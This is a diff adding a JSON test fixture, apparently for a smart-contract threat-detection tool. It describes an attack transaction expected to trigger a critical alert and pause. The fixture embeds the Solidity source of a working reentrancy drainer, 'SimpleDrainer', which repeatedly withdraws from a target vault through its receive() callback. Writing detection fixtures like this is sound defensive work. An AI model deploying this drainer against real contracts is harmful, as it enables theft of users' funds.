@@ -1,0 +1,35 @@
+{
+  "_description": "Attack function call - should trigger CRITICAL",
+  "contractAddress": "0x997E47e8169b1A9112F9Bc746De6b2b74c3B5AE1",
+  "chainId": 11155111,
+  "transactionHash": "0xattack1234567890attack1234567890attack1234567890attack1234567890",
+  "contractName": "SimpleDrainer",
+  "sourceCode": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.19;\n\ninterface IVault {\n    function deposit() external payable;\n    function withdraw(uint256 amount) external;\n}\n\ncontract SimpleDrainer {\n    IVault public target;\n    uint256 public drainCount;\n    \n    constructor(address _target) {\n        target = IVault(_target);\n    }\n    \n    function attack(uint256 amount) external payable {\n        target.deposit{value: msg.value}();\n        target.withdraw(amount);\n    }\n    \n    receive() external payable {\n        if (address(target).balance >= 0.001 ether && drainCount < 10) {\n            drainCount++;\n            target.withdraw(0.001 ether);\n        }\n    }\n}",
+  "transactionContext": {
+    "hash": "0xattack1234567890attack1234567890attack1234567890attack1234567890",
+    "from": "0xAttacker0000000000000000000000000000000000",
+    "to": "0x997E47e8169b1A9112F9Bc746De6b2b74c3B5AE1",
+    "value": "0.001",
+    "data": "0x64dd891a0000000000000000000000000000000000000000000000000002386f26fc10000",
+    "threatSummary": [
+      {
+        "level": "CRITICAL",
+        "details": "🚨 ATTACK FUNCTION DETECTED: attack(uint256)"
+      }
+    ]
+  },
+  "acePolicy": {
+    "passed": false,
+    "policy": "sentinel-threat-assessment-v1",
+    "riskScore": 98,
+    "recommendedAction": "PAUSE_IMMEDIATELY",
+    "violations": [
+      {
+        "rule": "CRITICAL_THREAT_DETECTED",
+        "severity": "CRITICAL",
+        "details": "Attack function signature detected"
+      }
+    ]
+  },
+  "urgency": "critical"
+}
